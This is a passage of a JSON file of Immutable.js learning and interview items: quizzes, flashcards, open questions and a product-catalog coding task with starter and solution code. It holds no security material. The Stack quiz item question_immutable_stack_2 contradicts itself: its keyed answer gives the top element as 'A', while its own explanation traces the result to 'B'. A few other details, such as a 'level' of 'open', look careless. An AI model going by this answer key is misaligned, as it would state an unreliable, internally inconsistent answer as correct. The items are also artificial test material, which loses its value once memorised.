          "answer": "```typescript\nimport { List } from 'immutable';\n\nfunction sortNumbersInList(list: List<number>): List<number> {\n  // The sort method on Immutable.List returns a new sorted list\n  return list.sort();\n}\n\n// Example usage:\nconst originalList = List([5, 2, 8, 1, 9, 3]);\nconst sortedList = sortNumbersInList(originalList);\n\nconsole.log('Original List:', originalList.toJS()); // [5, 2, 8, 1, 9, 3]\nconsole.log('Sorted List:', sortedList.toJS());   // [1, 2, 3, 5, 8, 9]\n\nconst anotherList = List([10, 0, -5, 7]);\nconst anotherSortedList = sortNumbersInList(anotherList);\nconsole.log('Another Sorted List:', anotherSortedList.toJS()); // [-5, 0, 7, 10]\n```",
          "options": [],
          "analysisPoints": [
            "Correct usage of `List.prototype.sort()`.",
            "Understanding that `sort()` returns a new list, adhering to immutability.",
            "TypeScript type annotations."
          ],
          "keyConcepts": [
            "Immutable.List",
            "Sorting",
            "Immutability",
            "TypeScript"
          ],
          "evaluationCriteria": [
            "Functional correctness (list is sorted).",
            "Adherence to immutability (original list unchanged).",
            "Proper function signature and types."
          ],
          "example": "The key is to use the `sort()` method directly on the `Immutable.List`. Unlike JavaScript's `Array.prototype.sort()`, `Immutable.List.prototype.sort()` is pure and returns a new sorted `List` instance.",
          "tags": [
            "Immutable.List",
            "Coding Challenge",
            "Sorting",
            "Immutability"
          ],
          "prerequisites": [
            "theory_immutable_list"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_stack_1",
          "topic": "Immutable.Stack LIFO",
          "level": "easy",
          "type": "mcq",
          "question": "What does LIFO stand for in the context of `Immutable.Stack`?",
          "answer": "Last In, First Out",
          "options": [
            "Last In, First Out",
            "Lowest Input, Fastest Output",
            "Lazy Initialization, Fast Operations",
            "List In, First Out"
          ],
          "analysisPoints": [
            "Understanding of common data structure acronyms.",
            "Correct association of LIFO with Stack."
          ],
          "keyConcepts": [
            "Immutable.Stack",
            "LIFO",
            "Data Structures"
          ],
          "evaluationCriteria": [
            "Accurate definition of LIFO."
          ],
          "example": "A stack of plates: you add new plates to the top (last in), and when you take a plate, you take it from the top (first out).",
          "tags": [
            "Immutable.Stack",
            "Data Structures",
            "Concepts"
          ],
          "prerequisites": [
            "theory_immutable_stack"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_stack_2",
          "topic": "Immutable.Stack Operations",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Immutable.js code:\n\n```typescript\nimport { Stack } from 'immutable';\n\nlet myStack = Stack();\nmyStack = myStack.push('A', 'B'); // 'B' is top, then 'A'\nmyStack = myStack.push('C'); // 'C' is top\nmyStack = myStack.pop();\nconst topElement = myStack.get(0);\nconst size = myStack.size;\n```\n\nWhat will be the value of `topElement` and `size`?",
          "answer": "topElement: 'A', size: 2",
          "options": [
            "topElement: 'C', size: 2",
            "topElement: 'B', size: 3",
            "topElement: 'A', size: 2",
            "topElement: 'B', size: 2"
          ],
          "analysisPoints": [
            "Correctly tracing `push` and `pop` operations on a stack.",
            "Understanding that `push` adds to the 'top' (index 0 for `get`).",
            "Accurate calculation of `size` after operations."
          ],
          "keyConcepts": [
            "Immutable.Stack",
            "LIFO",
            "Stack Operations"
          ],
          "evaluationCriteria": [
            "Accuracy of top element determination.",
            "Correct size calculation.",
            "Understanding of stack behavior."
          ],
          "example": "1. `myStack = Stack();` // Stack: []\n2. `myStack = myStack.push('A', 'B');` // Stack: ['B', 'A'] (B is top, at index 0)\n3. `myStack = myStack.push('C');` // Stack: ['C', 'B', 'A'] (C is top, at index 0)\n4. `myStack = myStack.pop();` // Stack: ['B', 'A'] (C removed)\n5. `topElement = myStack.get(0);` // 'B'\n6. `size = myStack.size;` // 2",
          "tags": [
            "Immutable.Stack",
            "Operations",
            "LIFO",
            "Debugging"
          ],
          "prerequisites": [
            "theory_immutable_stack"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_stack_3",
          "topic": "Immutable.Stack Use Case",
          "level": "medium",
          "type": "open",
          "question": "Describe a common real-world use case where `Immutable.Stack` would be a suitable data structure. Provide a brief explanation of why it fits the LIFO principle.",
          "answer": "A common use case for `Immutable.Stack` is implementing an **undo/redo functionality** in an application. When a user performs an action, the state before the action is 'pushed' onto an undo stack. To undo, the last state 'popped' from the undo stack is restored. Similarly, for redo, undone states can be pushed onto a redo stack. This fits the LIFO principle because the last action performed is the first one to be undone, and the last undone action is the first to be redone.",
          "options": [],
          "analysisPoints": [
            "Identifying a relevant and practical use case.",
            "Clearly explaining how the LIFO principle applies to that use case.",
            "Demonstrating understanding of stack's strengths."
          ],
          "keyConcepts": [
            "Immutable.Stack",
            "LIFO",
            "Use Cases",
            "Undo/Redo"
          ],
          "evaluationCriteria": [
            "Relevance of the use case.",
            "Logical connection between use case and LIFO.",
            "Clarity of explanation."
          ],
          "example": "Imagine a text editor. Every time you type a character or apply formatting, the previous document state is added to an undo stack. If you hit 'undo', the most recent state is popped off, and the document reverts to the state before that change.",
          "tags": [
            "Immutable.Stack",
            "Use Cases",
            "Architecture",
            "Design Patterns"
          ],
          "prerequisites": [
            "theory_immutable_stack"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_map_1",
          "topic": "Immutable.Map Basic Operations",
          "level": "medium",
          "type": "mcq",
          "question": "What is the output of `map.toJS()` after the following operations?\n\n```typescript\nimport { Map } from 'immutable';\n\nlet map = Map({ a: 1, b: 2 });\nmap = map.set('c', 3);\nmap = map.delete('a');\nmap = map.set('b', 10);\n\nconsole.log(map.toJS());\n```",
          "answer": "{ b: 10, c: 3 }",
          "options": [
            "{ a: 1, b: 2, c: 3 }",
            "{ b: 2, c: 3 }",
            "{ b: 10, c: 3 }",
            "{ a: 1, c: 3 }"
          ],
          "analysisPoints": [
            "Correctly tracing `set` and `delete` operations on `Immutable.Map`.",
            "Understanding that `set` can update existing keys.",
            "Awareness of the immutability (each operation returns a new Map)."
          ],
          "keyConcepts": [
            "Immutable.Map",
            "Operations",
            "Key-Value"
          ],
          "evaluationCriteria": [
            "Accuracy of final Map content.",
            "Correct application of `set` for updates."
          ],
          "example": "1. `map = Map({ a: 1, b: 2 });` // Map: { a: 1, b: 2 }\n2. `map = map.set('c', 3);` // Map: { a: 1, b: 2, c: 3 }\n3. `map = map.delete('a');` // Map: { b: 2, c: 3 }\n4. `map = map.set('b', 10);` // Map: { b: 10, c: 3 }\nOutput: `{ b: 10, c: 3 }`",
          "tags": [
            "Immutable.Map",
            "Operations",
            "Debugging"
          ],
          "prerequisites": [
            "theory_immutable_map"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_map_2",
          "topic": "Immutable.Map vs. JavaScript Object",
          "level": "medium",
          "type": "open",
          "question": "When would you prefer using `Immutable.Map` over a plain JavaScript object for storing key-value data in a frontend application?",
          "answer": "You would prefer `Immutable.Map` over a plain JavaScript object when:\n1.  **State Management:** In complex applications, especially with libraries like React and Redux, where predictable state changes are critical for debugging and consistency.\n2.  **Performance Optimization:** When dealing with frequent updates to large data structures, `Immutable.Map`'s structural sharing allows for efficient change detection (reference equality checks) and avoids costly deep cloning operations.\n3.  **Preventing Accidental Mutations:** To ensure data integrity by guaranteeing that data is never unexpectedly modified by different parts of the application.\n4.  **Complex Keys:** `Immutable.Map` (and `JS Map`) allows non-string keys (e.g., other objects), which plain JS objects do not handle natively.\n5.  **Functional Programming Paradigms:** It aligns better with functional programming principles by promoting pure functions without side effects.",
          "options": [],
          "analysisPoints": [
            "Understanding the benefits of immutability in practical scenarios.",
            "Connecting it to performance, state management, and debugging.",
            "Identifying specific features (like complex keys) that distinguish it from plain objects."
          ],
          "keyConcepts": [
            "Immutable.Map",
            "JavaScript Object",
            "Comparison",
            "Use Cases",
            "Performance"
          ],
          "evaluationCriteria": [
            "Providing multiple valid reasons.",
            "Clear explanation of why `Immutable.Map` is superior in those scenarios.",
            "Demonstrating knowledge of immutability's impact."
          ],
          "example": "Imagine a user profile object in a Redux store. If it's a plain JS object, a component might accidentally mutate it, leading to subtle bugs and difficult-to-trace state changes. An `Immutable.Map` ensures that any 'modification' returns a new object, forcing explicit updates and making state changes transparent.",
          "tags": [
            "Immutable.Map",
            "JavaScript Object",
            "Comparison",
            "Use Cases"
          ],
          "prerequisites": [
            "theory_immutable_map",
            "theory_immutable_js_intro"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_immutable_map_3",
          "topic": "Immutable.Map Methods",
          "level": "easy",
          "type": "flashcard",
          "question": "Which `Immutable.Map` method is used to add or update a key-value pair?",
          "answer": "`set(key, value)`",
          "options": [],
          "analysisPoints": [
            "Recall of fundamental Map operations.",
            "Correct method signature."
          ],
          "keyConcepts": [
            "Immutable.Map",
            "Methods"
          ],
          "evaluationCriteria": [
            "Direct recall"
          ],
          "example": "```typescript\nimport { Map } from 'immutable';\n\nlet user = Map({ name: 'Alice' });\nuser = user.set('age', 30); // Add new key\nuser = user.set('name', 'Bob'); // Update existing key\nconsole.log(user.toJS()); // { name: 'Bob', age: 30 }\n```",
          "tags": [
            "Immutable.Map",
            "Methods"
          ],
          "prerequisites": [
            "theory_immutable_map"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_map_4",
          "topic": "Immutable.Map Merging",
          "level": "medium",
          "type": "code",
          "question": "Implement a TypeScript function `mergeUserData` that takes an initial `Immutable.Map<string, any>` representing user data and a partial `Immutable.Map<string, any>` representing updates. The function should return a new `Immutable.Map` with the updates applied, ensuring immutability. If a key exists in both, the update's value should take precedence.",
          "answer": "```typescript\nimport { Map } from 'immutable';\n\nfunction mergeUserData(\n  initialData: Map<string, any>,\n  updates: Map<string, any>\n): Map<string, any> {\n  // The merge method correctly combines maps, with the latter taking precedence for conflicts\n  return initialData.merge(updates);\n}\n\n// Example usage:\nconst currentUser = Map({\n  id: 'user123',\n  name: 'Alice',\n  email: 'alice@example.com',\n  settings: Map({ theme: 'dark', notifications: true })\n});\n\nconst partialUpdate = Map({\n  email: 'alice.smith@example.com',\n  status: 'active',\n  settings: Map({ theme: 'light' }) // Nested map is also merged, but shallowly here\n});\n\nconst updatedUser = mergeUserData(currentUser, partialUpdate);\n\nconsole.log('Original User:', currentUser.toJS());\n/*\n{ \n  id: 'user123',\n  name: 'Alice',\n  email: 'alice@example.com',\n  settings: { theme: 'dark', notifications: true }\n}\n*/\n\nconsole.log('Updated User:', updatedUser.toJS());\n/*\n{ \n  id: 'user123',\n  name: 'Alice',\n  email: 'alice.smith@example.com',\n  status: 'active',\n  settings: { theme: 'light' } // Note: settings map is replaced entirely if not deep merged\n}\n*/\n\n// If deep merge is desired for nested maps, use mergeDeep\nconst deepUpdatedUser = currentUser.mergeDeep(partialUpdate);\nconsole.log('Deep Merged User:', deepUpdatedUser.toJS());\n/*\n{ \n  id: 'user123',\n  name: 'Alice',\n  email: 'alice.smith@example.com',\n  status: 'active',\n  settings: { theme: 'light', notifications: true } // 'notifications' is preserved\n}\n*/\n```",
          "options": [],
          "analysisPoints": [
            "Correctly using the `merge()` method of `Immutable.Map`.",
            "Understanding that `merge()` returns a new `Map`.",
            "Consideration of deep merging vs. shallow merging for nested structures (`mergeDeep` vs `merge`)."
          ],
          "keyConcepts": [
            "Immutable.Map",
            "Merging",
            "Immutability",
            "TypeScript"
          ],
          "evaluationCriteria": [
            "Functional correctness of merge logic.",
            "Adherence to immutability.",
            "Proper function signature and types."
          ],
          "example": "The `merge()` method is perfect for this. It takes another `Map` (or a plain object) and combines its entries. If there are duplicate keys, the values from the `updates` map will overwrite those from `initialData`. For nested Immutable structures, `mergeDeep()` might be more appropriate if you want to merge objects at all levels rather than replacing them.",
          "tags": [
            "Immutable.Map",
            "Coding Challenge",
            "Merging",
            "Immutability"
          ],
          "prerequisites": [
            "theory_immutable_map"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_orderedmap_1",
          "topic": "Immutable.OrderedMap Order Preservation",
          "level": "medium",
          "type": "mcq",
          "question": "What is the key distinguishing feature of `Immutable.OrderedMap` compared to `Immutable.Map`?",
          "answer": "It preserves the original insertion order of keys.",
          "options": [
            "It allows duplicate keys.",
            "It stores data more efficiently for very large datasets.",
            "It provides faster access to values by key.",
            "It preserves the original insertion order of keys."
          ],
          "analysisPoints": [
            "Identifying the primary benefit and difference of `OrderedMap`.",
            "Discarding distractors that might apply to `Map` generally or are incorrect."
          ],
          "keyConcepts": [
            "Immutable.OrderedMap",
            "Immutable.Map",
            "Order Preservation",
            "Comparison"
          ],
          "evaluationCriteria": [
            "Accurate identification of the distinguishing feature."
          ],
          "example": "If you create `new Map().set('b', 2).set('a', 1)`, the iteration order of 'a' and 'b' is not guaranteed. However, with `new OrderedMap().set('b', 2).set('a', 1)`, iterating will always yield 'b' then 'a'.",
          "tags": [
            "Immutable.OrderedMap",
            "Comparison",
            "Concepts"
          ],
          "prerequisites": [
            "theory_immutable_orderedmap",
            "theory_immutable_map"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_orderedmap_2",
          "topic": "Immutable.OrderedMap Iteration",
          "level": "medium",
          "type": "mcq",
          "question": "What will be the output order of keys when iterating over `myMap` using `for...of` in the following code?\n\n```typescript\nimport { OrderedMap } from 'immutable';\n\nlet myMap = OrderedMap();\nmyMap = myMap.set('zebra', 1);\nmyMap = myMap.set('apple', 2);\nmyMap = myMap.set('banana', 3);\nmyMap = myMap.set('apple', 10); // Update existing key\n\n// for (const [key, value] of myMap) { console.log(key); }\n```",
          "answer": "zebra, apple, banana",
          "options": [
            "zebra, apple, banana",
            "apple, banana, zebra",
            "banana, apple, zebra",
            "Order is not guaranteed with OrderedMap."
          ],
          "analysisPoints": [
            "Understanding that `OrderedMap` preserves *initial* insertion order.",
            "Recognizing that updating an existing key does not change its position.",
            "Tracing the insertion sequence."
          ],
          "keyConcepts": [
            "Immutable.OrderedMap",
            "Iteration Order",
            "Insertion Order"
          ],
          "evaluationCriteria": [
            "Correct prediction of iteration order.",
            "Understanding of update behavior in `OrderedMap`."
          ],
          "example": "1. `set('zebra', 1)`: 'zebra' is first.\n2. `set('apple', 2)`: 'apple' is second.\n3. `set('banana', 3)`: 'banana' is third.\n4. `set('apple', 10)`: 'apple' already exists, its value is updated, but its position (second) remains the same.\nSo the order is always: 'zebra', 'apple', 'banana'.",
          "tags": [
            "Immutable.OrderedMap",
            "Iteration",
            "Order"
          ],
          "prerequisites": [
            "theory_immutable_orderedmap"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_orderedmap_3",
          "topic": "Immutable.OrderedMap Use Cases",
          "level": "open",
          "type": "open",
          "question": "Provide a practical scenario in frontend development where `Immutable.OrderedMap` would be more appropriate than `Immutable.Map`, and explain why.",
          "answer": "A practical scenario for `Immutable.OrderedMap` is managing **dynamic form fields** where the order of fields is determined by user input or specific business logic and must be preserved for display. For example, a form builder that allows users to add custom fields (e.g., 'Name', 'Email', 'Address') and reorder them.\n\n`Immutable.OrderedMap` is more appropriate because:\n1.  **UI Consistency:** The order of fields in the UI directly depends on the order they were added or rearranged by the user. A regular `Immutable.Map` does not guarantee insertion order, so the fields might render inconsistently or unpredictably.\n2.  **Serialization/Deserialization:** If you need to serialize the form schema to JSON and later deserialize it, `OrderedMap` ensures that the fields are restored in the exact same sequence, which is critical for consistent user experience and data processing.\n\n`Immutable.Map` would be insufficient because its iteration order is not guaranteed, meaning the form fields might appear in a different sequence each time the component renders, leading to a poor user experience.",
          "options": [],
          "analysisPoints": [
            "Identifying a real-world scenario where order is crucial.",
            "Clearly articulating why `OrderedMap` is superior in that scenario.",
            "Contrasting it with `Immutable.Map` to highlight the difference."
          ],
          "keyConcepts": [
            "Immutable.OrderedMap",
            "Use Cases",
            "Order Preservation",
            "UI Development"
          ],
          "evaluationCriteria": [
            "Relevance and clarity of the use case.",
            "Logical reasoning for choosing `OrderedMap`.",
            "Understanding of the limitations of `Immutable.Map`."
          ],
          "example": "In a dashboard builder, users can add widgets like 'Sales Chart', 'User List', 'Recent Activity'. If they arrange them in a specific column order, using `OrderedMap` to store the widget configuration ensures they always load and display in that exact custom order.",
          "tags": [
            "Immutable.OrderedMap",
            "Use Cases",
            "Frontend Architecture"
          ],
          "prerequisites": [
            "theory_immutable_orderedmap"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_immutable_set_1",
          "topic": "Immutable.Set Uniqueness",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following is the primary characteristic of `Immutable.Set`?",
          "answer": "It stores only unique values.",
          "options": [
            "It stores only unique values.",
            "It preserves the order of insertion.",
            "It allows fast access to values by index.",
            "It can store key-value pairs."
          ],
          "analysisPoints": [
            "Identifying the fundamental property of a Set (uniqueness).",
            "Distinguishing it from other collection types."
          ],
          "keyConcepts": [
            "Immutable.Set",
            "Uniqueness",
            "Characteristics"
          ],
          "evaluationCriteria": [
            "Accurate identification of the primary characteristic."
          ],
          "example": "If you try to add the value `5` to an `Immutable.Set` that already contains `5`, the set will remain unchanged (it won't add a duplicate), and the operation will return the same set instance, leveraging structural sharing.",
          "tags": [
            "Immutable.Set",
            "Concepts",
            "Uniqueness"
          ],
          "prerequisites": [
            "theory_immutable_set"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_set_2",
          "topic": "Immutable.Set Operations",
          "level": "medium",
          "type": "mcq",
          "question": "What is the output of `s1.intersect(s2).toJS()` given the following code?\n\n```typescript\nimport { Set } from 'immutable';\n\nconst s1 = Set([1, 2, 3, 4]);\nconst s2 = Set([3, 4, 5, 6]);\n\nconst result = s1.intersect(s2).toJS();\nconsole.log(result);\n```",
          "answer": "[3, 4]",
          "options": [
            "[1, 2, 3, 4, 5, 6]",
            "[3, 4]",
            "[1, 2]",
            "[5, 6]"
          ],
          "analysisPoints": [
            "Correctly applying the `intersect()` set operation.",
            "Understanding what `intersect` means (common elements).",
            "Knowing how `toJS()` converts the Set to an Array."
          ],
          "keyConcepts": [
            "Immutable.Set",
            "Set Operations",
            "Intersection"
          ],
          "evaluationCriteria": [
            "Accuracy of the intersection result.",
            "Correct conversion to JS Array."
          ],
          "example": "The `intersect()` method finds elements that are common to *both* sets. In this case, `1` and `2` are only in `s1`, and `5` and `6` are only in `s2`. `3` and `4` are present in both `s1` and `s2`, hence they are the intersection.",
          "tags": [
            "Immutable.Set",
            "Operations",
            "Set Logic"
          ],
          "prerequisites": [
            "theory_immutable_set"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_set_3",
          "topic": "Immutable.Set Conversion",
          "level": "easy",
          "type": "flashcard",
          "question": "Name three methods that convert an `Immutable.Set` instance to a plain JavaScript Array.",
          "answer": "`toJS()`, `toArray()`, `toJSON()`",
          "options": [],
          "analysisPoints": [
            "Recall of multiple conversion methods for Sets.",
            "Understanding that they are aliases for Set."
          ],
          "keyConcepts": [
            "Immutable.Set",
            "Conversion",
            "Methods"
          ],
          "evaluationCriteria": [
            "Direct recall of method names"
          ],
          "example": "```typescript\nimport { Set } from 'immutable';\n\nconst mySet = Set([1, 2, 3]);\nconsole.log(mySet.toJS());   // [1, 2, 3]\nconsole.log(mySet.toArray()); // [1, 2, 3]\nconsole.log(mySet.toJSON());  // [1, 2, 3]\n```",
          "tags": [
            "Immutable.Set",
            "Methods",
            "Conversion"
          ],
          "prerequisites": [
            "theory_immutable_set"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_orderedset_1",
          "topic": "Immutable.OrderedSet vs. Set",
          "level": "medium",
          "type": "open",
          "question": "What is the primary difference and a suitable use case distinguishing `Immutable.OrderedSet` from `Immutable.Set`?",
          "answer": "The primary difference is **order preservation**. While both `Immutable.Set` and `Immutable.OrderedSet` ensure that all values are unique, `Immutable.OrderedSet` additionally guarantees that the order in which elements were *first inserted* is maintained when iterating or converting to a JavaScript array. `Immutable.Set` does not guarantee any specific order.\n\nA suitable use case for `Immutable.OrderedSet` would be managing a list of **unique search tags or filters** that a user has applied, where the visual display order of these tags on the UI needs to reflect the order in which the user selected them. For example, if a user filters by 'red', then 'small', then 'new', the tags should consistently appear as 'red', 'small', 'new' in the UI.",
          "options": [],
          "analysisPoints": [
            "Clearly identifying order preservation as the key differentiator.",
            "Providing a concrete, logical use case where this difference matters.",
            "Explaining *why* order matters in the given use case."
          ],
          "keyConcepts": [
            "Immutable.OrderedSet",
            "Immutable.Set",
            "Comparison",
            "Order Preservation",
            "Use Cases"
          ],
          "evaluationCriteria": [
            "Accurate comparison.",
            "Relevant and well-explained use case.",
            "Demonstrating practical application."
          ],
          "example": "If you add `['apple', 'banana', 'apple', 'cherry']` to an `Immutable.OrderedSet`, converting it `toJS()` will yield `['apple', 'banana', 'cherry']` in that exact order. An `Immutable.Set` might return `['apple', 'cherry', 'banana']` or `['banana', 'apple', 'cherry']` depending on internal hash collision resolution or JS engine specifics.",
          "tags": [
            "Immutable.OrderedSet",
            "Comparison",
            "Use Cases"
          ],
          "prerequisites": [
            "theory_immutable_orderedset",
            "theory_immutable_set"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_orderedset_2",
          "topic": "Immutable.OrderedSet Union",
          "level": "medium",
          "type": "mcq",
          "question": "What is the output of `s1.union(s2).toJS()` given the following code?\n\n```typescript\nimport { OrderedSet } from 'immutable';\n\nconst s1 = OrderedSet(['a', 'b']);\nconst s2 = OrderedSet(['b', 'c', 'a']);\n\nconst result = s1.union(s2).toJS();\nconsole.log(result);\n```",
          "answer": "['a', 'b', 'c']",
          "options": [
            "['a', 'b', 'c']",
            "['b', 'c', 'a']",
            "['a', 'b', 'b', 'c', 'a']",
            "['a', 'b']"
          ],
          "analysisPoints": [
            "Correctly applying the `union()` set operation for `OrderedSet`.",
            "Understanding that `union` combines unique elements.",
            "Preservation of first-seen insertion order from the combined sets."
          ],
          "keyConcepts": [
            "Immutable.OrderedSet",
            "Set Operations",
            "Union",
            "Order Preservation"
          ],
          "evaluationCriteria": [
            "Accuracy of the union result.",
            "Correct order of elements in the result."
          ],
          "example": "1. `s1` contributes 'a', then 'b'.\n2. `s2` contributes 'b' (already seen), then 'c' (new), then 'a' (already seen).\nTherefore, the first time 'a' is seen is from `s1`, then 'b' from `s1`, then 'c' from `s2`. The unique, ordered result is `['a', 'b', 'c']`.",
          "tags": [
            "Immutable.OrderedSet",
            "Operations",
            "Order",
            "Set Logic"
          ],
          "prerequisites": [
            "theory_immutable_orderedset"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_orderedset_3",
          "topic": "Immutable.OrderedSet Functionality",
          "level": "easy",
          "type": "flashcard",
          "question": "Does `Immutable.OrderedSet` allow duplicate values?",
          "answer": "No, like `Immutable.Set`, it only stores unique values. The 'Ordered' part refers to preserving insertion order among unique values.",
          "options": [],
          "analysisPoints": [
            "Understanding the core uniqueness property of all Sets.",
            "Distinguishing the 'Ordered' aspect as related to order, not uniqueness."
          ],
          "keyConcepts": [
            "Immutable.OrderedSet",
            "Uniqueness",
            "Order Preservation"
          ],
          "evaluationCriteria": [
            "Direct recall of uniqueness property"
          ],
          "example": "```typescript\nimport { OrderedSet } from 'immutable';\n\nlet myOrderedSet = OrderedSet([1, 2, 2, 3, 1]);\nconsole.log(myOrderedSet.toJS()); // [1, 2, 3]\nconsole.log(myOrderedSet.size); // 3\n```",
          "tags": [
            "Immutable.OrderedSet",
            "Concepts",
            "Uniqueness"
          ],
          "prerequisites": [
            "theory_immutable_orderedset"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        }
      ],
      "tasks": [
        {
          "id": "task_immutable_js_intro_1",
          "title": "Migrate and Manage Product Data Immutably",
          "description": "\nYour task is to refactor an existing product data management system to use `Immutable.js` for better state predictability and performance. You need to convert plain JavaScript arrays and objects into Immutable.js collections, perform some common operations immutably, and then convert them back for display.\n\n**Requirements:**\n1.  Create an initial product catalog using `Immutable.List` of `Immutable.Map`s from a given plain JS array of objects.\n2.  Implement a function `addProduct` that takes the current immutable catalog and a new product object (plain JS), and returns a new immutable catalog with the product added.\n3.  Implement a function `updateProductPrice` that takes the current immutable catalog, a product ID, and a new price. It should return a new immutable catalog with the specified product's price updated. This update must be done immutably.\n4.  Implement a function `removeProduct` that takes the current immutable catalog and a product ID, and returns a new immutable catalog with the product removed.\n5.  Finally, implement a function `getJsCatalog` that converts the final immutable catalog back to a plain JavaScript array of objects.\n",
          "difficulty": "medium",
          "startingCode": "import { List, Map } from 'immutable';\n\ninterface Product { \n  id: string; \n  name: string; \n  price: number; \n  inStock: boolean; \n}\n\nconst initialProducts: Product[] = [\n  { id: 'p1', name: 'Laptop', price: 1200, inStock: true },\n  { id: 'p2', name: 'Mouse', price: 25, inStock: true },\n  { id: 'p3', name: 'Keyboard', price: 75, inStock: false }\n];\n\n// 1. Function to initialize immutable catalog\nfunction initializeCatalog(products: Product[]): List<Map<string, any>> {\n  // TODO: Implement this\n  return List();\n}\n\n// 2. Function to add a product\nfunction addProduct(catalog: List<Map<string, any>>, newProduct: Product): List<Map<string, any>> {\n  // TODO: Implement this\n  return catalog;\n}\n\n// 3. Function to update product price\nfunction updateProductPrice(catalog: List<Map<string, any>>, productId: string, newPrice: number): List<Map<string, any>> {\n  // TODO: Implement this\n  return catalog;\n}\n\n// 4. Function to remove a product\nfunction removeProduct(catalog: List<Map<string, any>>, productId: string): List<Map<string, any>> {\n  // TODO: Implement this\n  return catalog;\n}\n\n// 5. Function to convert immutable catalog to plain JS\nfunction getJsCatalog(catalog: List<Map<string, any>>): Product[] {\n  // TODO: Implement this\n  return [];\n}\n\n// Example Usage (for testing your functions):\nconst immutableCatalog = initializeCatalog(initialProducts);\nconsole.log('Initial Immutable Catalog (JS):', getJsCatalog(immutableCatalog));\n\nconst newProduct = { id: 'p4', name: 'Monitor', price: 300, inStock: true };\nconst catalogAfterAdd = addProduct(immutableCatalog, newProduct);\nconsole.log('Catalog After Add (JS):', getJsCatalog(catalogAfterAdd));\n\nconst catalogAfterUpdate = updateProductPrice(catalogAfterAdd, 'p1', 1150);\nconsole.log('Catalog After Update (JS):', getJsCatalog(catalogAfterUpdate));\n\nconst catalogAfterRemove = removeProduct(catalogAfterUpdate, 'p2');\nconsole.log('Catalog After Remove (JS):', getJsCatalog(catalogAfterRemove));\n\n// Verify original catalog is unchanged\nconsole.log('Original Catalog Still Intact (JS):', getJsCatalog(immutableCatalog));\n",
          "solutionCode": "import { List, Map } from 'immutable';\n\ninterface Product { \n  id: string; \n  name: string; \n  price: number; \n  inStock: boolean; \n}\n\nconst initialProducts: Product[] = [\n  { id: 'p1', name: 'Laptop', price: 1200, inStock: true },\n  { id: 'p2', name: 'Mouse', price: 25, inStock: true },\n  { id: 'p3', name: 'Keyboard', price: 75, inStock: false }\n];\n\n// 1. Function to initialize immutable catalog\nfunction initializeCatalog(products: Product[]): List<Map<string, any>> {\n  return List(products.map(product => Map(product)));\n}\n\n// 2. Function to add a product\nfunction addProduct(catalog: List<Map<string, any>>, newProduct: Product): List<Map<string, any>> {\n  return catalog.push(Map(newProduct));\n}\n\n// 3. Function to update product price\nfunction updateProductPrice(catalog: List<Map<string, any>>, productId: string, newPrice: number): List<Map<string, any>> {\n  const index = catalog.findIndex(product => product.get('id') === productId);\n  if (index !== -1) {\n    return catalog.update(index, product => product.set('price', newPrice));\n  }\n  return catalog; // Return original if not found\n}\n\n// 4. Function to remove a product\nfunction removeProduct(catalog: List<Map<string, any>>, productId: string): List<Map<string, any>> {\n  const index = catalog.findIndex(product => product.get('id') === productId);\n  if (index !== -1) {\n    return catalog.delete(index);\n  }\n  return catalog; // Return original if not found\n}\n\n// 5. Function to convert immutable catalog to plain JS\nfunction getJsCatalog(catalog: List<Map<string, any>>): Product[] {\n  return catalog.toJS() as Product[];\n}\n\n// Example Usage (for testing your functions):\nconst immutableCatalog = initializeCatalog(initialProducts);\nconsole.log('Initial Immutable Catalog (JS):', getJsCatalog(immutableCatalog));\n\nconst newProduct = { id: 'p4', name: 'Monitor', price: 300, inStock: true };\nconst catalogAfterAdd = addProduct(immutableCatalog, newProduct);\nconsole.log('Catalog After Add (JS):', getJsCatalog(catalogAfterAdd));\n\nconst catalogAfterUpdate = updateProductPrice(catalogAfterAdd, 'p1', 1150);\nconsole.log('Catalog After Update (JS):', getJsCatalog(catalogAfterUpdate));\n\nconst catalogAfterRemove = removeProduct(catalogAfterUpdate, 'p2');\nconsole.log('Catalog After Remove (JS):', getJsCatalog(catalogAfterRemove));\n\n// Verify original catalog is unchanged\nconsole.log('Original Catalog Still Intact (JS):', getJsCatalog(immutableCatalog));\n\n// Test edge cases\nconst catalogAfterNonExistentUpdate = updateProductPrice(catalogAfterAdd, 'non-existent', 999);\nconsole.log('Catalog After Non-Existent Update (JS - should be same as catalogAfterAdd):', getJsCatalog(catalogAfterNonExistentUpdate));\n\nconst catalogAfterNonExistentRemove = removeProduct(catalogAfterUpdate, 'non-existent');\nconsole.log('Catalog After Non-Existent Remove (JS - should be same as catalogAfterUpdate):', getJsCatalog(catalogAfterNonExistentRemove));",
          "testCases": [
